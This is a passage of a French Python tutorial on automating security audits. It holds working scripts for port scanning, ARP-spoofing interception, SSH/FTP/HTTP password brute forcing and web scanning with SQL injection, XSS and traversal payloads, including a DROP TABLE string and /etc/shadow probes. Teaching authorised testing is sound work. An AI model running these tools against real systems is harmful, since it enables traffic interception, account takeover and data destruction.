# Python pour l'Audit et l'Automatisation d'Attaques (Usage Éthique et Légal)

## Introduction : Pourquoi Python est l'arme secrète du professionnel en cybersécurité

Python est devenu le langage de référence dans le domaine de la cybersécurité pour plusieurs raisons :
- Simplicité et rapidité : On écrit moins de code, on teste plus vite
- Bibliothèques spécialisées : Des modules prêts à l'emploi pour le réseau, le forensic, le cracking
- Scripting vs Compilation : Pas besoin de compiler, on modifie et on relance
- Communauté énorme : Des milliers d'outils existants à étudier et modifier

AVERTISSEMENT IMPORTANT : Ce cours est destiné à des professionnels de la sécurité, des administrateurs système, et des étudiants en cybersécurité dans un cadre légal (tests d'intrusion autorisés, laboratoires personnels, CTF). L'utilisation de ces techniques contre des systèmes sans autorisation est ILLÉGALE.

## PARTIE 1 : LES FONDATIONS DU NINJA PYTHON


#### Chapitre 1 : Installation et Premier Contact

```bash
# Vérifier si Python est installé
python3 --version

# Sur Kali Linux (déjà préinstallé généralement)
sudo apt update
sudo apt install python3 python3-pip

# Notre premier script - hello_hacker.py
#!/usr/bin/env python3
print("[+] Bienvenue dans le monde du hacking éthique avec Python")
nom = input("[?] Quel est ton nom d'auditeur ? ")
print(f"[+] Prêt à automatiser des tests, {nom} !")
```

## Chapitre 2 : Les Bases Indispensables (en mode "hacker mindset")

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : bases_hacker.py
USAGE : Les fondamentaux avec une mentalité "sécurité"
"""

# ==============================================
# 1. VARIABLES ET TYPES - La reconnaissance
# ==============================================

cible_ip = "192.168.1.1"           # String - Une adresse IP
ports_communs = [21, 22, 80, 443]  # List - Des ports à scanner
informations = {                    # Dict - Infos sur la cible
    "os": "Windows 10",
    "services": ["http", "ssh"],
    "vulnérable": True
}
est_en_ligne = True                 # Boolean - État de la cible

print(f"[*] Cible: {cible_ip}")
print(f"[*] Ports à tester: {ports_communs}")
print(f"[*] OS détecté: {informations['os']}")

# ==============================================
# 2. STRUCTURES DE CONTRÔLE - La logique d'attaque
# ==============================================

# Conditionnelle - Décision basée sur les résultats
if informations["vulnérable"]:
    print("[!] Cible vulnérable ! Lancement des exploits...")
else:
    print("[-] Cible sécurisée, passage à autre chose")

# Boucles - Automatisation des tâches répétitives
print("[*] Scan des ports en cours...")
for port in ports_communs:
    print(f"    - Test du port {port}")
    # Ici, on ajoutera la logique de connexion

# While - Attente d'événement
tentatives = 0
while tentatives < 3:
    print(f"[*] Tentative de connexion #{tentatives + 1}")
    tentatives += 1
    # Simulation de connexion qui échoue
    if tentatives == 3:
        print("[!] Connexion échouée après 3 tentatives")

# ==============================================
# 3. FONCTIONS - Modulariser ses attaques
# ==============================================

def scanner_port(ip, port):
    """
    Simule un scan de port (à améliorer avec socket)
    """
    print(f"[*] Scan de {ip}:{port}")
    # Simulation: le port 80 est toujours ouvert
    if port == 80:
        return True
    return False

def banner_grabber(ip, port):
    """
    Récupère la bannière d'un service
    """
    if scanner_port(ip, port):
        print(f"[+] Port {port} ouvert - Récupération de la bannière")
        # Simulation
        return "Apache/2.4.41 (Ubuntu)"
    return None

# Utilisation
resultat = banner_grabber("192.168.1.1", 80)
if resultat:
    print(f"[+] Bannière: {resultat}")

# ==============================================
# 4. GESTION DES ERREURS - Ne pas planter pendant l'opération
# ==============================================

def connexion_risquee(ip):
    """
    Gestion élégante des erreurs (le réseau tombe, la cible refuse...)
    """
    try:
        # Code qui pourrait échouer
        print(f"[*] Tentative de connexion à {ip}")
        # Simulation d'une erreur réseau
        raise ConnectionRefusedError("Connexion refusée")
    except ConnectionRefusedError:
        print("[-] Connexion refusée - La cible n'écoute pas")
        return False
    except TimeoutError:
        print("[-] Timeout - La cible ne répond pas")
        return False
    except Exception as e:
        print(f"[-] Erreur inattendue: {e}")
        return False
    else:
        # Exécuté si pas d'erreur
        print("[+] Connexion établie")
        return True
    finally:
        # Toujours exécuté (nettoyage)
        print("[*] Fin de la tentative")

connexion_risquee("192.168.1.100")

# ==============================================
# 5. MANIPULATION DE FICHIERS - Gérer les résultats
# ==============================================

def save_results(resultats, filename="scan_results.txt"):
    """
    Sauvegarde les résultats dans un fichier
    """
    try:
        with open(filename, 'a') as f:
            f.write(f"{resultats}\n")
        print(f"[+] Résultats sauvegardés dans {filename}")
    except IOError as e:
        print(f"[-] Erreur d'écriture: {e}")

def load_targets(filename="targets.txt"):
    """
    Charge une liste de cibles depuis un fichier
    """
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        print(f"[+] {len(targets)} cibles chargées")
        return targets
    except FileNotFoundError:
        print(f"[-] Fichier {filename} non trouvé")
        return []

# Exemple
save_results("192.168.1.1:80 - Apache")
cibles = load_targets("cibles.txt")
```

## PARTIE 2 : RÉSEAU ET SCANNING - LES YEUX DU HACKER

### Chapitre 3 : Socket Programming - Parler le langage du réseau

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : scanner_reseau.py
USAGE : Scanner de ports et récupération de bannières
"""

import socket
import sys
from datetime import datetime
import threading
from queue import Queue

# ==============================================
# 3.1 SCANNER DE PORTS BASIQUE
# ==============================================

def scan_port(ip, port):
    """
    Vérifie si un port est ouvert sur une IP cible
    """
    try:
        # Création d'un socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)  # Timeout de 1 seconde
        
        # Tentative de connexion
        result = sock.connect_ex((ip, port))
        
        if result == 0:
            return True
        else:
            return False
            
        sock.close()
    except Exception as e:
        return False

def scanner_simple(ip, start_port, end_port):
    """
    Scan une plage de ports (version simple)
    """
    print(f"[*] Scan de {ip} du port {start_port} au {end_port}")
    print("[*] Début du scan:", datetime.now())
    
    ports_ouverts = []
    
    for port in range(start_port, end_port + 1):
        if scan_port(ip, port):
            print(f"[+] Port {port} OUVERT")
            ports_ouverts.append(port)
        else:
            # Affichage progressif (optionnel)
            # print(f"[-] Port {port} fermé", end='\r')
            pass
    
    print("[*] Fin du scan:", datetime.now())
    return ports_ouverts

# ==============================================
# 3.2 VERSION MULTI-THREADÉE (BEAUCOUP PLUS RAPIDE)
# ==============================================

# File d'attente pour les threads
queue = Queue()
ports_ouverts = []

def scan_port_thread(ip):
    """
    Fonction exécutée par chaque thread
    """
    global queue, ports_ouverts
    
    while not queue.empty():
        port = queue.get()
        if scan_port(ip, port):
            print(f"[+] Port {port} OUVERT")
            ports_ouverts.append(port)
        queue.task_done()

def scanner_multithread(ip, ports):
    """
    Scan avec threads pour plus de vitesse
    """
    print(f"[*] Scan multi-thread de {ip}")
    print(f"[*] {len(ports)} ports à scanner")
    
    # Remplir la queue
    for port in ports:
        queue.put(port)
    
    # Créer et démarrer les threads
    threads = []
    for _ in range(50):  # 50 threads en parallèle
        thread = threading.Thread(target=scan_port_thread, args=(ip,))
        thread.start()
        threads.append(thread)
    
    # Attendre que tous les threads finissent
    queue.join()
    
    # Arrêter les threads
    for thread in threads:
        thread.join()
    
    return ports_ouverts

# ==============================================
# 3.3 RÉCUPÉRATION DE BANNIÈRES (BANNER GRABBING)
# ==============================================

def get_banner(ip, port):
    """
    Tente de récupérer la bannière d'un service sur un port ouvert
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        
        # Envoi d'une requête générique selon le port
        if port == 80:  # HTTP
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        elif port == 21:  # FTP
            pass  # La bannière arrive automatiquement
        elif port == 25:  # SMTP
            sock.send(b"EHLO test.com\r\n")
        else:
            sock.send(b"\r\n")
        
        # Réception de la réponse
        banner = sock.recv(1024).decode().strip()
        sock.close()
        
        return banner
    except:
        return None

def scan_with_banner(ip, ports):
    """
    Scan les ports et tente de récupérer les bannières
    """
    print(f"[*] Scan avancé de {ip} avec récupération de bannières")
    
    for port in ports:
        if scan_port(ip, port):
            print(f"[+] Port {port} OUVERT", end='')
            banner = get_banner(ip, port)
            if banner:
                print(f" - Bannière: {banner[:50]}...")
            else:
                print(" - Pas de bannière")

# ==============================================
# 3.4 SCANNER DE RÉSEAU COMPLET
# ==============================================

def ip_range_to_list(ip_range):
    """
    Convertit une plage IP en liste d'IPs
    Exemple: "192.168.1.1-100" -> liste de 100 IPs
    """
    import ipaddress
    
    if '-' in ip_range:
        base, last = ip_range.split('-')
        base_parts = base.split('.')
        start = int(base_parts[-1])
        
        ips = []
        for i in range(start, int(last) + 1):
            base_parts[-1] = str(i)
            ips.append('.'.join(base_parts))
        return ips
    else:
        return [ip_range]

def scanner_reseau(ip_range, ports=[21,22,23,25,80,110,139,443,445,3389]):
    """
    Scan un réseau entier pour trouver des machines avec ports ouverts
    """
    ips = ip_range_to_list(ip_range)
    print(f"[*] Scan du réseau: {len(ips)} machines à tester")
    
    machines_trouvees = []
    
    for ip in ips:
        print(f"[*] Test de {ip}")
        try:
            # Ping simple pour voir si la machine est en ligne
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 80))  # Test port 80
            sock.close()
            
            if result == 0:
                print(f"[+] Machine {ip} en ligne!")
                machines_trouvees.append(ip)
        except:
            pass
    
    return machines_trouvees

# ==============================================
# MAIN - Point d'entrée du programme
# ==============================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║   Scanner Réseau - Version Éducative  ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Exemple d'utilisation
    cible = input("[?] IP cible (ex: 192.168.1.1): ")
    
    if not cible:
        cible = "127.0.0.1"  # Localhost pour test
    
    print("[1] Scan rapide (ports 1-1024)")
    print("[2] Scan avec bannières")
    print("[3] Scan réseau complet")
    
    choix = input("[?] Votre choix: ")
    
    if choix == "1":
        ports = scanner_simple(cible, 1, 1024)
        print(f"[+] Ports ouverts: {ports}")
    
    elif choix == "2":
        scan_with_banner(cible, [21,22,80,443,3306,8080])
    
    elif choix == "3":
        reseau = input("[?] Plage IP (ex: 192.168.1.1-254): ")
        machines = scanner_reseau(reseau)
        print(f"[+] Machines trouvées: {machines}")
```

## PARTIE 3 : ATTAQUES RÉSEAU AUTOMATISÉES

### Chapitre 4 : ARP Spoofing / Man-in-the-Middle (MITM)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : arp_spoof.py
USAGE : Démonstration ARP spoofing (usage éducatif uniquement)
NOTE : Nécessite les privilèges root et scapy
"""

import time
import sys
from scapy.all import *

class ARPSpoofer:
    """
    Classe pour réaliser une attaque ARP spoofing
    ATTENTION: Usage légal uniquement sur votre propre réseau
    """
    
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        
        print(f"[*] Configuration initiale:")
        print(f"    - Cible: {target_ip} ({self.target_mac})")
        print(f"    - Passerelle: {gateway_ip} ({self.gateway_mac})")
        print(f"    - Interface: {interface}")
    
    def get_mac(self, ip):
        """
        Obtient l'adresse MAC d'une IP via ARP
        """
        try:
            # Création d'une requête ARP
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Envoi et réception
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            return answered_list[0][1].hwsrc
        except:
            print(f"[-] Impossible d'obtenir MAC pour {ip}")
            return None
    
    def spoof(self):
        """
        Envoie des paquets ARP empoisonnés
        """
        # Dire à la cible que je suis la passerelle
        target_packet = ARP(op=2, pdst=self.target_ip, 
                            hwdst=self.target_mac, 
                            psrc=self.gateway_ip)
        
        # Dire à la passerelle que je suis la cible
        gateway_packet = ARP(op=2, pdst=self.gateway_ip,
                             hwdst=self.gateway_mac,
                             psrc=self.target_ip)
        
        # Envoi des paquets
        send(target_packet, verbose=False)
        send(gateway_packet, verbose=False)
    
    def restore(self):
        """
        Restaure les tables ARP à leur état normal
        """
        print("[*] Restauration des tables ARP...")
        
        # Restauration de la cible
        target_packet = ARP(op=2, pdst=self.target_ip,
                            hwdst=self.target_mac,
                            psrc=self.gateway_ip,
                            hwsrc=self.gateway_mac)
        
        # Restauration de la passerelle
        gateway_packet = ARP(op=2, pdst=self.gateway_ip,
                             hwdst=self.gateway_mac,
                             psrc=self.target_ip,
                             hwsrc=self.target_mac)
        
        # Envoi multiple pour être sûr
        send(target_packet, count=4, verbose=False)
        send(gateway_packet, count=4, verbose=False)
    
    def start(self):
        """
        Lance l'attaque continue
        """
        print("[!] Lancement de l'attaque ARP spoofing...")
        print("[!] Appuyez sur Ctrl+C pour arrêter")
        
        try:
            packets_sent = 0
            while True:
                self.spoof()
                packets_sent += 2
                print(f"[*] Paquets empoisonnés envoyés: {packets_sent}", end='\r')
                time.sleep(2)  # Rafraîchir toutes les 2 secondes
        except KeyboardInterrupt:
            print("\n[!] Arrêt demandé")
            self.restore()
            print("[+] Tables ARP restaurées")
    
    def enable_ip_forwarding(self):
        """
        Active le forwarding IP pour que le trafic passe
        """
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        print("[*] IP forwarding activé")

# ==============================================
# EXEMPLE D'UTILISATION
# ==============================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║    ARP Spoofing - Démonstration       ║
    ║    USAGE ÉDUCATIF UNIQUEMENT           ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Configuration
    target = input("[?] IP de la cible: ")
    gateway = input("[?] IP de la passerelle (default: 192.168.1.1): ") or "192.168.1.1"
    interface = input("[?] Interface réseau (default: eth0): ") or "eth0"
    
    # Vérification
    print(f"\n[!] Vous allez empoisonner {target} en lui faisant croire")
    print(f"[!] que la passerelle {gateway} est à votre adresse MAC.")
    print("[!] Le trafic passera par votre machine.")
    
    confirm = input("\n[?] Continuer? (oui/non): ")
    
    if confirm.lower() == "oui":
        # Création et lancement
        spoofer = ARPSpoofer(target, gateway, interface)
        spoofer.enable_ip_forwarding()
        spoofer.start()
    else:
        print("[-] Annulation")
```

## PARTIE 4 : BRUTE FORCE ET CRACKING DE MOTS DE PASSE

### Chapitre 5 : Attaques par dictionnaire

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : brute_forcer.py
USAGE : Tests de brute force pour audits de sécurité
"""

import paramiko  # Pour SSH
import ftplib    # Pour FTP
import requests  # Pour HTTP
import time
from threading import Thread, BoundedSemaphore
from queue import Queue

class BruteForcer:
    """
    Classe générique pour les attaques par dictionnaire
    """
    
    def __init__(self, target, service, username, wordlist, delay=0):
        self.target = target
        self.service = service.lower()
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.found = False
        self.queue = Queue()
        self.semaphore = BoundedSemaphore(10)  # Limite de threads
        
    def load_wordlist(self):
        """
        Charge la wordlist depuis un fichier
        """
        try:
            with open(self.wordlist, 'r', encoding='latin-1') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"[+] {len(passwords)} mots de passe chargés")
            return passwords
        except FileNotFoundError:
            print(f"[-] Fichier {self.wordlist} non trouvé")
            return []
    
    def test_ssh(self, password):
        """
        Teste une connexion SSH
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(self.target, username=self.username, 
                          password=password, timeout=3)
            print(f"\n[!] MOT DE PASSE TROUVÉ: {self.username}:{password}")
            self.found = True
            client.close()
            return True
        except paramiko.AuthenticationException:
            # Mauvais mot de passe
            return False
        except Exception as e:
            # Autre erreur (timeout, etc)
            print(f"[-] Erreur: {e}")
            return False
        finally:
            client.close()
    
    def test_ftp(self, password):
        """
        Teste une connexion FTP
        """
        try:
            ftp = ftplib.FTP(self.target)
            ftp.login(self.username, password)
            print(f"\n[!] MOT DE PASSE TROUVÉ: {self.username}:{password}")
            ftp.quit()
            self.found = True
            return True
        except ftplib.error_perm:
            return False
        except Exception as e:
            return False
    
    def test_http_basic(self, password):
        """
        Teste une authentification HTTP Basic
        """
        try:
            auth = (self.username, password)
            response = requests.get(f"http://{self.target}", 
                                   auth=auth, timeout=3)
            
            if response.status_code == 200:
                print(f"\n[!] MOT DE PASSE TROUVÉ: {self.username}:{password}")
                self.found = True
                return True
            else:
                return False
        except:
            return False
    
    def worker(self):
        """
        Thread worker qui teste les mots de passe
        """
        while not self.queue.empty() and not self.found:
            password = self.queue.get()
            
            # Ne pas spammer
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Afficher progression
            if self.queue.qsize() % 100 == 0:
                print(f"[*] Tests restants: {self.queue.qsize()}", end='\r')
            
            # Tester selon le service
            success = False
            try:
                if self.service == "ssh":
                    success = self.test_ssh(password)
                elif self.service == "ftp":
                    success = self.test_ftp(password)
                elif self.service == "http":
                    success = self.test_http_basic(password)
            except:
                pass
            
            if success:
                self.found = True
                # Vider la queue
                with self.queue.mutex:
                    self.queue.queue.clear()
                break
            
            self.queue.task_done()
    
    def start_attack(self, threads=5):
        """
        Lance l'attaque avec plusieurs threads
        """
        passwords = self.load_wordlist()
        if not passwords:
            return
        
        print(f"[*] Début de l'attaque sur {self.target}:{self.service}")
        print(f"[*] Utilisateur: {self.username}")
        print(f"[*] Threads: {threads}")
        
        # Remplir la queue
        for pwd in passwords:
            self.queue.put(pwd)
        
        # Créer et démarrer les threads
        thread_list = []
        for _ in range(min(threads, len(passwords))):
            t = Thread(target=self.worker)
            t.start()
            thread_list.append(t)
        
        # Attendre la fin
        for t in thread_list:
            t.join()
        
        if not self.found:
            print("\n[-] Aucun mot de passe trouvé")

# ==============================================
# HYDRA-LIKE EN PYTHON SIMPLE
# ==============================================

class SimpleHydra:
    """
    Version simplifiée de Hydra pour comprendre le concept
    """
    
    def __init__(self):
        self.results = {}
    
    def attack_ssh(self, target, userlist, passlist):
        """
        Attaque SSH avec listes d'utilisateurs et mots de passe
        """
        print(f"[*] Attaque SSH sur {target}")
        
        # Charger les utilisateurs
        users = []
        with open(userlist, 'r') as f:
            users = [line.strip() for line in f]
        
        # Charger les mots de passe
        passwords = []
        with open(passlist, 'r', encoding='latin-1') as f:
            passwords = [line.strip() for line in f]
        
        print(f"[*] {len(users)} utilisateurs × {len(passwords)} mots de passe")
        print(f"[*] Total combinaisons: {len(users) * len(passwords)}")
        
        found = 0
        for user in users:
            for password in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, username=user, password=password, timeout=2)
                    
                    print(f"\n[!] SUCCÈS: {user}:{password}")
                    self.results[f"{user}@{target}"] = password
                    found += 1
                    
                    ssh.close()
                    
                except paramiko.AuthenticationException:
                    # Échec d'auth, continuer
                    pass
                except Exception as e:
                    # Autre erreur (réseau, etc)
                    print(f"[-] Erreur: {e}")
                    break
                
                # Progression
                print(f"[*] Testé: {user}:{password}", end='\r')
        
        print(f"\n[+] {found} comptes trouvés")
        return self.results

# ==============================================
# MAIN
# ==============================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║   Brute Forcer - Test de Robustesse   ║
    ║   Usage légal uniquement               ║
    ╚═══════════════════════════════════════╝
    """)
    
    print("[1] SSH - Un utilisateur")
    print("[2] FTP")
    print("[3] HTTP Basic Auth")
    print("[4] SSH - Multi-utilisateurs (Hydra-like)")
    
    choix = input("[?] Choix: ")
    
    if choix == "1":
        target = input("Cible IP: ")
        user = input("Utilisateur: ")
        wordlist = input("Wordlist (ex: rockyou.txt): ")
        
        bf = BruteForcer(target, "ssh", user, wordlist, delay=0.5)
        bf.start_attack(threads=3)
    
    elif choix == "4":
        target = input("Cible IP: ")
        users = input("Liste d'utilisateurs: ")
        passes = input("Liste de mots de passe: ")
        
        hydra = SimpleHydra()
        hydra.attack_ssh(target, users, passes)
```

## PARTIE 5 : EXPLOITATION WEB

### Chapitre 6 : Scanner de vulnérabilités web

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : web_scanner.py
USAGE : Scanner de vulnérabilités web basique
"""

import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
from queue import Queue
import time

class WebVulnScanner:
    """
    Scanner de vulnérabilités web (XSS, SQLi, Directory Traversal)
    """
    
    def __init__(self, base_url, threads=5):
        self.base_url = base_url.rstrip('/')
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Scanner - Educational)'
        })
        self.discovered_urls = []
        self.vulnerabilities = []
        self.queue = Queue()
        
    def crawl(self, url=None, max_pages=50):
        """
        Crawle le site pour découvrir des URLs
        """
        if url is None:
            url = self.base_url
        
        to_crawl = [url]
        crawled = set()
        
        print(f"[*] Crawling {self.base_url}...")
        
        while to_crawl and len(crawled) < max_pages:
            current_url = to_crawl.pop(0)
            
            if current_url in crawled:
                continue
            
            try:
                response = self.session.get(current_url, timeout=5)
                crawled.add(current_url)
                self.discovered_urls.append(current_url)
                print(f"[+] Découvert: {current_url}")
                
                # Parse HTML pour trouver des liens
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href and not href.startswith('#'):
                        full_url = urljoin(current_url, href)
                        
                        # Ne garder que les URLs du même domaine
                        if urlparse(full_url).netloc == urlparse(self.base_url).netloc:
                            if full_url not in crawled and full_url not in to_crawl:
                                to_crawl.append(full_url)
                                
            except Exception as e:
                print(f"[-] Erreur sur {current_url}: {e}")
            
            time.sleep(0.5)  # Politesse
        
        print(f"[+] {len(self.discovered_urls)} URLs découvertes")
        return self.discovered_urls
    
    def test_sqli(self, url):
        """
        Teste les vulnérabilités SQL Injection basiques
        """
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "\" OR \"1\"=\"1",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "'; DROP TABLE users; --",
        ]
        
        error_patterns = [
            "sql",
            "mysql",
            "sqlite",
            "syntax error",
            "unclosed quotation mark",
            "you have an error in your sql",
        ]
        
        parsed = urlparse(url)
        params = {}
        
        # Extraire les paramètres GET
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value
        
        if not params:
            return
        
        for param in params:
            original_value = params[param]
            
            for payload in payloads:
                # Construire l'URL avec le payload
                test_params = params.copy()
                test_params[param] = original_value + payload
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if test_params:
                    test_url += "?" + "&".join([f"{k}={v}" for k, v in test_params.items()])
                
                try:
                    response = self.session.get(test_url, timeout=3)
                    
                    # Chercher des patterns d'erreur SQL
                    content = response.text.lower()
                    for pattern in error_patterns:
                        if pattern in content:
                            vuln = {
                                'type': 'SQL Injection',
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'evidence': pattern
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] SQLi possible: {url}?{param}={original_value}{payload}")
                            break
                            
                except:
                    pass
    
    def test_xss(self, url):
        """
        Teste les vulnérabilités XSS
        """
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
        ]
        
        parsed = urlparse(url)
        params = {}
        
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value
        
        if not params:
            return
        
        for param in params:
            original_value = params[param]
            
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if test_params:
                    test_url += "?" + "&".join([f"{k}={v}" for k, v in test_params.items()])
                
                try:
                    response = self.session.get(test_url, timeout=3)
                    
                    # Vérifier si le payload est reflété sans encodage
                    if payload in response.text and '<' in response.text:
                        vuln = {
                            'type': 'Reflected XSS',
                            'url': url,
                            'param': param,
                            'payload': payload
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] XSS possible: {url}?{param}={payload}")
                        break
                        
                except:
                    pass
    
    def test_directory_traversal(self):
        """
        Teste les vulnérabilités de directory traversal
        """
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]
        
        common_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/windows/win.ini",
            "/boot.ini",
            "/etc/hosts",
        ]
        
        # Tester directement sur des fichiers courants
        for file_path in common_files:
            test_url = urljoin(self.base_url, file_path)
            try:
                response = self.session.get(test_url, timeout=3)
                
                if response.status_code == 200:
                    # Vérifier si le contenu ressemble à un fichier système
                    if "root:" in response.text or "[fonts]" in response.text:
                        vuln = {
                            'type': 'Directory Traversal',
                            'url': test_url,
                            'evidence': 'File accessible'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Fichier accessible: {test_url}")
                        
            except:
                pass
    
    def scan_worker(self):
        """
        Thread worker pour le scan
        """
        while not self.queue.empty():
            url = self.queue.get()
            
            print(f"[*] Test de {url}")
            self.test_sqli(url)
            self.test_xss(url)
            
            self.queue.task_done()
    
    def start_scan(self):
        """
        Lance le scan complet
        """
        print(f"[*] Début du scan de {self.base_url}")
        
        # D'abord crawler
        self.crawl()
        
        # Mettre les URLs dans la queue
        for url in self.discovered_urls:
            self.queue.put(url)
        
        # Ajouter aussi les formulaires à tester (simplifié)
        
        # Lancer les threads pour les tests
        print(f"[*] Lancement des tests de vulnérabilités...")
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.scan_worker)
            t.daemon = True
            t.start()
        
        self.queue.join()
        
        # Test directory traversal
        self.test_directory_traversal()
        
        # Rapport
        self.generate_report()
    
    def generate_report(self):
        """
        Génère un rapport des vulnérabilités trouvées
        """
        print("\n" + "="*50)
        print("RAPPORT DE SCAN")
        print("="*50)
        
        if not self.vulnerabilities:
            print("[-] Aucune vulnérabilité trouvée")
            return
        
        print(f"[!] {len(self.vulnerabilities)} vulnérabilités trouvées:\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"{i}. Type: {vuln['type']}")
            print(f"   URL: {vuln['url']}")
            if 'param' in vuln:
                print(f"   Paramètre: {vuln['param']}")
            if 'payload' in vuln:
                print(f"   Payload: {vuln['payload']}")
            if 'evidence' in vuln:
                print(f"   Evidence: {vuln['evidence']}")
            print()

# ==============================================
# MAIN
# ==============================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║   Web Vulnerability Scanner           ║
    ║   Version Éducative                    ║
    ╚═══════════════════════════════════════╝
    """)
    
    target = input("[?] URL cible (ex: http://testphp.vulnweb.com): ")
    
    if target:
        scanner = WebVulnScanner(target, threads=3)
        scanner.start_scan()
    else:
        print("[-] URL requise")
```

## PARTIE 6 : OUTILS SPÉCIALISÉS ET BONNES PRATIQUES

### Chapitre 7 : Création d'un outil multi-fonctions

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : security_toolkit.py
USAGE : Toolkit de sécurité modulaire
"""

import argparse
import sys
import os
from datetime import datetime

# Import de nos modules
try:
    from scanner_reseau import scanner_simple, scanner_multithread, scan_with_banner
    from arp_spoof import ARPSpoofer
    from brute_forcer import BruteForcer, SimpleHydra
    from web_scanner import WebVulnScanner
except ImportError:
    print("[!] Modules non trouvés. Assurez-vous que les fichiers sont dans le même dossier.")
    sys.exit(1)

class SecurityToolkit:
    """
    Interface unifiée pour tous nos outils
    """
    
    def __init__(self):
        self.start_time = datetime.now()
        self.results_dir = "resultats_scan"
        
        # Créer le dossier de résultats
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
    
    def banner(self):
        """Affiche une bannière stylée"""
        print("""
    ╔══════════════════════════════════════════════════════════╗
    ║     ███████╗███████╗ ██████╗██████╗ ███████╗███╗   ██╗  ║
    ║     ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝████╗  ██║  ║
    ║     ███████╗█████╗  ██║     ██████╔╝█████╗  ██╔██╗ ██║  ║
    ║     ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝  ██║╚██╗██║  ║
    ║     ███████║███████╗╚██████╗██║  ██║███████╗██║ ╚████║  ║
    ║     ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝  ║
    ║                                                          ║
    ║           Security Toolkit - Version Éducative          ║
    ║                  Usage Légal Uniquement                  ║
    ╚══════════════════════════════════════════════════════════╝
        """)
    
    def log_result(self, module, result):
        """Sauvegarde les résultats dans un fichier"""
        filename = f"{self.results_dir}/{module}_{self.start_time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'a') as f:
            f.write(f"[{datetime.now()}] {result}\n")
    
    def menu(self):
        """Affiche le menu principal"""
        print("\n[+] Modules disponibles:")
        print("   1. Scanner de ports réseau")
        print("   2. ARP Spoofing (MITM)")
        print("   3. Brute Force (SSH/FTP/HTTP)")
        print("   4. Scanner Web (XSS/SQLi)")
        print("   5. Quitter")
        
        choix = input("\n[?] Votre choix: ")
        
        if choix == "1":
            self.port_scanner_menu()
        elif choix == "2":
            self.arp_spoof_menu()
        elif choix == "3":
            self.bruteforce_menu()
        elif choix == "4":
            self.web_scanner_menu()
        elif choix == "5":
            print("[*] Au revoir!")
            sys.exit(0)
        else:
            print("[-] Choix invalide")
            self.menu()
    
    def port_scanner_menu(self):
        """Menu du scanner de ports"""
        print("\n[--- Scanner de ports ---]")
        
        target = input("IP cible: ")
        print("Type de scan:")
        print("  1. Scan simple (ports 1-1024)")
        print("  2. Scan multi-thread")
